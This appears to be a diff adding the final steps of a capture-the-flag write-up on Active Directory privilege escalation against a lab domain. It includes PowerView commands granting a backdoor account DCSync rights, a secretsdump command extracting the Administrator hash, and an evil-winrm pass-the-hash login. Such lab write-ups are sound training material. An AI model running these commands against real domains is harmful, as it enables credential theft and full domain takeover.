@@ -116,3 +116,25 @@ The following attack path has been discovered:
 
 svc-alfresco -> Account Operators (member of) -> Account Operators has generic all permissions to Exchange Windows Permissions -> Exchange Windows Permissions has WriteDacl permissions to HTB.LOCAL
 
+
+A backdoor account was created and `PowerView` was used to grant DCSync rights. This added the required replication permissions (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) to allow credential extraction from the domain controller.
+```
+$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('htb\Backdoor', $SecPassword)
+
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity Backdoor -Rights DCSync
+```
+
+![dcsync](Images/dcsync.png)
+
+Finally, the `impacket-secretsdump` tool was executed to retrieve the domain hashes and the `pass-the-hash` technique was used to bypass authentication methods and obtain a privileged shell as the Administrator.
+```
+impacket-secretsdump -just-dc-user Administrator htb/Backdoor:"Password1"@10.129.95.210
+```
+
+![hashes](Images/hashes.png)
+```
+evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+```
+
